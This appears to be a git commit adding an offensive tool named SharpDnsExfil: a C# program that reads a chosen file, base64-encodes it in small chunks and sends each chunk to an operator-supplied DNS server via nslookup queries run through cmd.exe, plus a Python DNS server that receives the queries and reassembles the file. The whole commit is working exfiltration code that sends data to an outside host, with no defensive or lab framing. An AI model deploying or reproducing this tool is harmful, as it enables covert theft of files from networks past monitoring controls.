4cb191ef34a6599855e75e97778cf93dbd95254e
aniqfakhrul <aniqfakhrul@mcoba.org>
2021-09-14 02:19:46 -0700

    Updated

---
+++ SharpDnsExfil/Program.cs
@@ -0,0 +1,198 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.IO;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Text.RegularExpressions;
+using CommandLine;
+
+namespace SharpDnsExfil
+{
+    class Logger
+    {
+        public static void WriteLine(string message)
+        {
+            if(Program.verbose)
+            {
+                message = $"[VERBOSE] {message}";
+                Console.WriteLine(message);
+            }
+        }
+    }
+
+    class Program
+    {
+
+        static void banner()
+        {
+            string help = @"
+____  _   _ ____  _____       __ _ _ 
+|  _ \| \ | / ___|| ____|_  __/ _(_) |
+| | | |  \| \___ \|  _| \ \/ / |_| | |
+| |_| | |\  |___) | |___ >  <|  _| | |
+|____/|_| \_|____/|_____/_/\_\_| |_|_|
+@ch4rm
+                                       ";
+            Console.WriteLine(help);
+        }
+
+        static void Exfiltrate(byte[] rawData)
+        {
+            string data = Convert.ToBase64String(rawData);
+            //Console.WriteLine(data);
+            //Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(data)));
+            string strCmd = $@"/c nslookup.exe -norecurse -query=AAAA {data}.{remoteServer} {publicIP} > nul";
+            
+            Logger.WriteLine($"{data}.{remoteServer}");
+
+            using (Process compiler = new Process())
+            {
+
+                compiler.StartInfo.FileName = @"cmd.exe";
+                compiler.StartInfo.Arguments = strCmd;
+                compiler.StartInfo.UseShellExecute = false;
+                compiler.StartInfo.CreateNoWindow = false;
+                compiler.StartInfo.RedirectStandardError = true;
+                compiler.StartInfo.RedirectStandardOutput = true;
+                compiler.Start();
+                compiler.WaitForExit();
+            }
+        }
+
+        static double ConvertBytesToMegabytes(long bytes)
+        {
+            return Math.Round((bytes / 1024f) / 1024f,6);
+        }
+
+        //https://github.com/nognomar/AppCenterClient/blob/b852e3eeb6dbee92ff771987a98449447084f3c8/src/Commands/AppCenterUploadApplicationService.cs#L104
+        private static IEnumerable<byte[]> ReadFileChunks(string fileName)
+        {
+            const int chunkSize = 45;
+            int bytesRead;
+            var buffer = new byte[chunkSize];
+            var fs = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);
+            totalSize = fs.Length;
+
+            Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + Path.GetFileName(fileName)));
+            Exfiltrate(Encoding.UTF8.GetBytes("File Size:::" + totalSize.ToString()));
+
+            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                if (bytesRead >= buffer.Length)
+                {
+                    yield return buffer;
+                }
+                else
+                {
+                    var truncatedBuffer = new byte[bytesRead];
+                    Array.Copy(buffer, truncatedBuffer, truncatedBuffer.Length);
+                    yield return truncatedBuffer;
+                }
+            }
+        }
+
+        private static void ReadSendFile(string filePath)
+        {
+            const int MAX_BUFFER = 45; 
+            byte[] buffer = new byte[MAX_BUFFER];
+            int bytesRead;
+            int noOfFiles = 0;
+            int currentByte = 0;
+            int oldPercent = 0;
+            using (FileStream fs = File.Open(filePath, FileMode.Open, FileAccess.Read))
+            using (BufferedStream bs = new BufferedStream(fs))
+            {
+                Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + Path.GetFileName(filePath)));
+                // send file size
+                //Exfiltrate(Encoding.UTF8.GetBytes("File Size:::"+ConvertBytesToMegabytes(fs.Length).ToString()));
+                Exfiltrate(Encoding.UTF8.GetBytes("File Size:::"+ fs.Length.ToString()));
+
+                while ((bytesRead = bs.Read(buffer, 0, MAX_BUFFER)) != 0) //reading 1mb chunks at a time
+                {
+                    noOfFiles++;
+                    currentByte += buffer.Length;
+                    //Let's create a small size file using the data. Or Pass this data for any further processing.
+                    int percent = (int)(0.5f + ((100f * currentByte) / fs.Length));
+
+                    if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
+                        Console.WriteLine($"Uploading to {remoteServer} - {percent}% transfered");
+                    oldPercent = percent;
+                    
+                    Exfiltrate(buffer);
+                }
+            }
+
+        }
+
+        public class Options
+        {
+            [Option('v', "verbose", Required = false, HelpText = "Set output to verbose messages.")]
+            public bool Verbose { get; set; }
+
+            [Option('f', "file", Required = true, HelpText = "Full filepath to target file")]
+            public string FilePath { get; set; }
+
+            [Option('s', "server", Required = true, HelpText = "Remote DNSServer IP/Hostname")]
+            public string Server { get; set; }
+
+            [Option('d', "domain", Required = false, HelpText = "Custom domain name [ Default = \"fakedomain.my\" ]")]
+            public string Domain { get; set; } = "fakedomain.my";
+        }
+
+        private static string remoteServer { get; set; }
+
+        private static string publicIP { get; set; }
+        
+        public static bool verbose = false;
+
+        private static long totalSize { get; set; }
+
+        static void Main(string[] args)
+        {
+            banner();
+
+            CommandLine.Parser.Default.ParseArguments<Options>(args)
+             .WithParsed(RunOptions)
+             .WithNotParsed(HandleParseError);
+
+        }
+
+        static void RunOptions(Options opts)
+        {
+            var filePath = opts.FilePath;
+            publicIP = opts.Server;
+            verbose = opts.Verbose;
+            remoteServer = opts.Domain;
+
+            int currentByte = 0;
+            int oldPercent = 0;
+
+            if (!File.Exists(filePath))
+            {
+                Logger.WriteLine("[!] File not exist");
+                return;
+            }
+
+            foreach(var chunk in ReadFileChunks(filePath))
+            {
+                currentByte += chunk.Length;
+                int percent = (int)(0.5f + ((100f * currentByte) / totalSize));
+
+                if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
+                    Console.WriteLine($"Uploading to {remoteServer} - {percent}% transfered");
+                oldPercent = percent;
+
+                Exfiltrate(chunk);
+            }
+
+            //ReadSendFile(filePath);
+        }
+
+        static void HandleParseError(IEnumerable<Error> errs)
+        {
+            //handle errors
+        }
+    }
+}
---
+++ dnserver.py
@@ -0,0 +1,198 @@
+#!/usr/bin/env python
+# coding=utf-8
+
+import argparse
+import datetime
+import sys
+import time
+import threading
+import traceback
+import socketserver
+import struct
+import re
+import random
+import string
+
+try:
+    from dnslib import *
+except ImportError:
+    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
+    sys.exit(2)
+
+
+class DomainName(str):
+    def __getattr__(self, item):
+        return DomainName(item + '.' + self)
+
+
+D = DomainName('example.com.')
+IP = '127.0.0.1'
+TTL = 60 * 5
+
+soa_record = SOA(
+    mname=D.ns1,  # primary name server
+    rname=D.andrei,  # email of the domain administrator
+    times=(
+        201307231,  # serial number
+        60 * 60 * 1,  # refresh
+        60 * 60 * 3,  # retry
+        60 * 60 * 24,  # expire
+        60 * 60 * 1,  # minimum
+    )
+)
+ns_records = [NS(D.ns1), NS(D.ns2)]
+records = {
+    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
+    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
+    D.ns2: [A(IP)],
+    D.mail: [A(IP)],
+    D.andrei: [CNAME(D)],
+}
+
+file_name = "output.txt"
+total_bytes = 0
+old_percent = 0
+current_byte = 0
+
+def write_file(b64_data):
+    global file_name,total_bytes, old_percent, current_byte
+    plain = base64.b64decode(b64_data)
+    if b"File Name:::" in plain:
+        file_name = ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + "_" + plain.decode('utf-8').split(":::")[1]
+        print(f"File output name is {file_name}")
+        return
+        
+    if b"File Size:::" in plain:
+        total_bytes = int(plain.decode('utf-8').split(":::")[1])
+        print(f"File size is {total_bytes}")        
+        return
+    
+    f = open(file_name,"ab")
+    f.write(plain)
+    
+    #file_size = os.path.getsize(file_name)
+    current_byte += len(plain)
+    try:
+        percentage = (current_byte/total_bytes)*100
+        if str(percentage)[0] != str(old_percent)[0]:
+            print(f"Progress is current: {format(percentage,'.2f')} percent")
+        old_percent = percentage
+
+        if not percentage % 100:
+            current_byte = 0
+    except:
+        pass
+
+def dns_response(data):
+    request = DNSRecord.parse(data)
+
+    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+
+    qname = request.q.qname
+    qn = str(qname)
+    qtype = request.q.qtype
+    qt = QTYPE[qtype]
+
+    if request.header.id == 2:
+        line = qn.split(".")[0]
+        write_file(line)
+
+    if qn == D or qn.endswith('.' + D):
+
+        for name, rrs in records.items():
+            if name == qn:
+                for rdata in rrs:
+                    rqt = rdata.__class__.__name__
+                    if qt in ['*', rqt]:
+                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
+
+        for rdata in ns_records:
+            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
+
+        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
+
+    return reply.pack()
+
+
+class BaseRequestHandler(socketserver.BaseRequestHandler):
+
+    def get_data(self):
+        raise NotImplementedError
+
+    def send_data(self, data):
+        raise NotImplementedError
+
+    def handle(self):
+        #now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
+        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],self.client_address[1]))
+        try:
+            data = self.get_data()
+            #print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
+            self.send_data(dns_response(data))
+        except Exception:
+            traceback.print_exc(file=sys.stderr)
+
+
+class TCPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        data = self.request.recv(8192).strip()
+        sz = struct.unpack('>H', data[:2])[0]
+        if sz < len(data) - 2:
+            raise Exception("Wrong size of TCP packet")
+        elif sz > len(data) - 2:
+            raise Exception("Too big TCP packet")
+        return data[2:]
+
+    def send_data(self, data):
+        sz = struct.pack('>H', len(data))
+        return self.request.sendall(sz + data)
+
+
+class UDPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        return self.request[0].strip()
+
+    def send_data(self, data):
+        return self.request[1].sendto(data, self.client_address)
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
+    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
+    parser.add_argument('--host', default='127.0.0.1', help='The host to listen on.')
+    parser.add_argument('--port', default=5053, type=int, help='The port to listen on.')
+    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
+    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
+    
+    args = parser.parse_args()
+    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")
+
+    print("Starting nameserver...")
+
+    servers = []
+    IP = args.host
+    if args.udp: servers.append(socketserver.ThreadingUDPServer((IP, args.port), UDPRequestHandler))
+    if args.tcp: servers.append(socketserver.ThreadingTCPServer((IP, args.port), TCPRequestHandler))
+
+    for s in servers:
+        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
+        thread.daemon = True  # exit the server thread when the main thread terminates
+        thread.start()
+        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
+
+    try:
+        while 1:
+            time.sleep(1)
+            sys.stderr.flush()
+            sys.stdout.flush()
+
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for s in servers:
+            s.shutdown()
+
+if __name__ == '__main__':
+    main()
